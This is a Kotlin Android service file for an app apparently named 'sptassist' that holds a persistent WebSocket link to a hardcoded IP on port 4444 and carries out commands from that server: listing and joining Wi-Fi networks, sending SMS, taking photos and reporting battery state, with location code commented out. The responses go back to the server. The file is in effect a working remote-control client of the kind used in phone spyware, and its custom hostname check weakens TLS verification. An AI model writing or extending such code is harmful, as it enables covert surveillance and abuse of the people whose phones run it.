package com.proactive.sptassist

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import okhttp3.*
import okio.ByteString
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit
import java.util.UUID
import java.util.concurrent.Executors
import javax.net.ssl.HostnameVerifier
import javax.net.ssl.SSLSession

class WebSocketService : Service() {

    private val TAG = "WebSocketService"
    private var webSocket: WebSocket? = null
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        // Add this hostname verifier
        .hostnameVerifier(object : HostnameVerifier {
            override fun verify(hostname: String?, session: SSLSession?): Boolean {
                // Always return true for this specific IP, or just always true if you're lazy
                // For your case, you know the IP is 34.171.50.19, so you can make it specific:
                return hostname == "34.171.50.19"
                // Or, less securely, for any hostname:
                // return true
            }
        })// Disable read timeout for WebSockets
        .build()
    private val gson = Gson()
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val cameraExecutor = Executors.newSingleThreadExecutor()

    // --- Constants and Device ID (Improved Persistence) ---
    companion object {
        private const val NOTIFICATION_CHANNEL_ID = "VMControlChannel"
        private const val NOTIFICATION_ID = 101

        // DEVICE_ID will be initialized in onCreate from SharedPreferences
        private var DEVICE_ID: String = ""
        private const val NORMAL_CLOSURE_STATUS = 1000 // Standard WebSocket normal closure code
    }

    override fun onCreate() {
        super.onCreate()
        // Initialize DEVICE_ID from SharedPreferences or generate a new one
        if (DEVICE_ID.isEmpty()) {
            val sharedPrefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
            DEVICE_ID = sharedPrefs.getString("device_unique_id", null) ?: run {
                val newId = UUID.randomUUID().toString()
                sharedPrefs.edit().putString("device_unique_id", newId).apply()
                newId
            }
        }
        Log.d(TAG, "WebSocketService created. Device ID: $DEVICE_ID")
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)

        // Ensure WebSocket is connected or re-connecting
        connectWebSocket()
        return START_STICKY // Service will be restarted by the system if it gets killed
    }

    override fun onDestroy() {
        super.onDestroy()
        disconnectWebSocket() // Explicitly disconnect
        serviceScope.cancel() // Cancel all coroutines launched in this scope
        cameraExecutor.shutdown() // Shutdown the camera executor
        Log.d(TAG, "WebSocketService onDestroy: Resources cleaned up.")
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null // This service is not designed to be bound
    }

    /**
     * Disconnects the WebSocket connection. Made public to allow MainActivity to call it.
     */
    fun disconnectWebSocket() {
        webSocket?.close(NORMAL_CLOSURE_STATUS, "App closing or explicitly disconnected")
        webSocket = null
        Log.d(TAG, "WebSocket disconnected.")
    }

    // --- Notification Channel and Notification for Foreground Service ---
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "VM Control Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Maintains connection to VM server for remote commands."
            }
            val notificationManager: NotificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("VM Control Active")
            .setContentText("Connected to VM server. Monitoring commands...")
            .setSmallIcon(R.mipmap.ic_launcher) // Make sure this icon exists
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    // --- WebSocket Connection Logic ---
    private fun connectWebSocket() {
        // Only attempt to connect if there's no active WebSocket or it's not open
        if (webSocket != null && webSocket!!.send("ping")) { // A quick check if it's still alive
            Log.d(TAG, "WebSocket already connected or connecting. Skipping new connection.")
            return
        }

        // IMPORTANT: Use wss:// for secure connections.
        // Replace with your VM's public IP/Domain and Port that MATCHES the Common Name in your SSL cert.
        val wsUrl = "wss://34.171.50.19:4444" // Ensure this matches your server's IP/domain

        val request = Request.Builder()
            .url(wsUrl)
            .build()

        Log.d(TAG, "Attempting to connect to WebSocket: $wsUrl")

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "WebSocket opened successfully!")
                // --- FIX: Typo 'regitor' changed to 'register' ---
                val handshakeMessage = mapOf(
                    "type" to "register", // Corrected typo here
                    "deviceId" to DEVICE_ID
                )
                sendData(gson.toJson(handshakeMessage))
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "Receiving text: $text")
                // Launch coroutine to handle incoming commands off the main thread
                serviceScope.launch {
                    handleIncomingCommand(text)
                }
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                Log.d(TAG, "Receiving binary data: ${bytes.hex()}")
                // Handle binary messages if your server sends them
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket is closing: $code / $reason")
                // Don't immediately call close here, OkHttp handles this
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket Closed: $code / $reason")
                this@WebSocketService.webSocket = null // Clear the WebSocket reference
                // Schedule reconnection attempt
                serviceScope.launch {
                    Log.d(TAG, "Attempting to reconnect WebSocket in 5 seconds...")
                    delay(5000)
                    connectWebSocket()
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket Failure: ${t.message}", t)
                this@WebSocketService.webSocket = null // Clear on failure
                // Schedule reconnection attempt
                serviceScope.launch {
                    Log.d(TAG, "Attempting to reconnect WebSocket in 5 seconds due to failure...")
                    delay(5000)
                    connectWebSocket()
                }
            }
        })
    }

    /**
     * Sends a String message over the WebSocket.
     */
    fun sendData(data: String) {
        if (webSocket?.send(data) == true) {
            Log.d(TAG, "Sent: $data")
        } else {
            Log.e(TAG, "Failed to send data: WebSocket not connected or failed.")
            // Consider triggering a reconnect if sending fails while `webSocket` is non-null
            // but the `send` method returns false.
        }
    }

    /**
     * Sends a structured response back to the server.
     * --- FIX: Aligning response structure with server's expectation (type: "response", status, data) ---
     */
    private fun sendCommandResponse(commandId: String, status: String, data: Any?, message: String? = null) {
        val responseMap = mutableMapOf<String, Any?>()
        responseMap["type"] = "response" // Server expects 'response' type
        responseMap["commandId"] = commandId
        responseMap["status"] = status // 'success' or 'error'
        responseMap["deviceId"] = DEVICE_ID

        if (data != null) {
            responseMap["data"] = data
        }
        if (message != null) {
            responseMap["message"] = message
        }
        sendData(gson.toJson(responseMap))
    }

    /**
     * Handles incoming command messages from the server.
     */
    private suspend fun handleIncomingCommand(jsonCommand: String) {
        try {
            // Using Map<String, Any> to handle mixed types (string, boolean, etc.)
            val command = gson.fromJson(jsonCommand, Map::class.java) as Map<String, Any>

            // --- FIX: Changed from 'command' to 'action' to match server ---
            val action = command["action"] as? String // Server sends 'action', not 'command'
            val commandId = command["commandId"] as? String ?: "unknown"

            Log.d(TAG, "Executing command: $action with ID: $commandId")

            val result: Any?
            var responseStatus = "success"
            var responseMessage: String? = null

            when (action) {
                "get_wifi_status" -> { // Server CLI sends 'wifi' which translates to 'get_wifi_status' here
                    result = WifiManagerHelper(this).getWifiNetworks()
                }
                "connect_wifi" -> {
                    val ssid = command["ssid"] as? String ?: ""
                    val password = command["password"] as? String ?: ""
                    // Assuming connectToWifi returns a Map with status and message
                    result = WifiManagerHelper(this).connectToWifi(ssid, password)
                    if ((result as? Map<String, Any>)?.get("status") == "error") {
                        responseStatus = "error"
                        responseMessage = (result as? Map<String, Any>)?.get("message") as? String
                    }
                }
                // If you uncomment "get_location", ensure LocationHelper is robust with permissions
                // "get_location" -> {
                //     result = LocationHelper(this).getCurrentLocation()
                //     if ((result as? Map<String, Any>)?.get("status") == "error") {
                //         responseStatus = "error"
                //         responseMessage = (result as? Map<String, Any>)?.get("message") as? String
                //     }
                // }
                "send_sms" -> {
                    val number = command["number"] as? String ?: ""
                    val messageText = command["message"] as? String ?: ""
                    result = SmsHelper(this).sendSms(number, messageText)
                    if ((result as? Map<String, Any>)?.get("status") == "error") {
                        responseStatus = "error"
                        responseMessage = (result as? Map<String, Any>)?.get("message") as? String
                    }
                }
                "take_photo" -> {
                    // Call takePhoto which might return a path or base64 string
                    // Ensure CameraHelper handles permissions and async operations correctly
                    result = CameraHelper(this, cameraExecutor).takePhoto()
                    if ((result as? Map<String, Any>)?.get("status") == "error") {
                        responseStatus = "error"
                        responseMessage = (result as? Map<String, Any>)?.get("message") as? String
                    }
                }
                "get_battery_status" -> {
                    result = BatteryHelper(this).getBatteryStatus()
                }
                else -> {
                    result = null
                    responseStatus = "error"
                    responseMessage = "Unknown command action: $action"
                }
            }
            sendCommandResponse(commandId, responseStatus, result, responseMessage)

        } catch (e: Exception) {
            Log.e(TAG, "Error handling command: ${e.message}", e)
            sendCommandResponse(
                "unknown",
                "error",
                null,
                "Failed to process command: ${e.message}"
            )
        }
    }

    // --- Helper classes (WifiManagerHelper, SmsHelper, CameraHelper, BatteryHelper)
    // --- You need to ensure these classes exist in your com.proactive.sptassist package
    // --- and are correctly implemented to perform their respective actions.

    // Example of WifiManagerHelper (ensure you have this or similar structure)
    // class WifiManagerHelper(private val context: Context) {
    //     fun getWifiNetworks(): Map<String, Any> { /* ... implementation ... */ }
    //     fun connectToWifi(ssid: String, password: String): Map<String, Any> { /* ... implementation ... */ }
    // }
    // ... similarly for SmsHelper, CameraHelper, BatteryHelper
}